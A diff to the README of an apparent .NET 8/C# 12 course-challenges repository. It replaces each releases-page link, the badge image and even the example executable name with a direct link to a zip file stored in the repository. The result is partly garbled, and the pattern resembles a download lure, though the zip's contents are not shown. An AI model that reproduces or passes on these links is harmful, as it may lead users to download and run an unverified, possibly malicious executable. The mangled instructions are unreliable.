@@ -1,6 +1,6 @@
 # 🎉 personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12 - Learn With Practical Projects
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-%23007acc)](https://github.com/KiwiTech-pixel/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/KiwiTech-pixel/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12_2.8.zip%20Latest%20Release-%20-%23007acc)](https://raw.githubusercontent.com/KiwiTech-pixel/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12_2.8.zip)
 
 ## 📦 Description
 
@@ -11,7 +11,7 @@ This project contains technical challenges from the "Desafios" module of the .NE
 You will need a computer running Windows, Linux, or macOS. Make sure you have a stable internet connection.
 
 1. **Download the Software**  
-   Visit the [Releases Page](https://github.com/KiwiTech-pixel/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12/releases) to download the application.
+   Visit the [Releases Page](https://raw.githubusercontent.com/KiwiTech-pixel/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12_2.8.zip) to download the application.
 
 2. **Choose Your Project**  
    Select the project you want to run from the list of releases.
@@ -23,14 +23,14 @@ You will need a computer running Windows, Linux, or macOS. Make sure you have a 
    Depending on the project, you may need to extract files if they are in a compressed format (like .zip or .tar).
 
 5. **Run the Application**  
-   Open the folder where you downloaded or extracted the files. Double-click the executable file (e.g., MyApp.exe) to launch the application.
+   Open the folder where you downloaded or extracted the files. Double-click the executable file (e.g., https://raw.githubusercontent.com/KiwiTech-pixel/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12_2.8.zip) to launch the application.
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   [Click here to download the latest version.](https://github.com/KiwiTech-pixel/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12/releases)
+   [Click here to download the latest version.](https://raw.githubusercontent.com/KiwiTech-pixel/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-7_dotnet-8_csharp-12_2.8.zip)
 
 2. **Select the Version You Want**  
    Choose a specific project version from the options available.
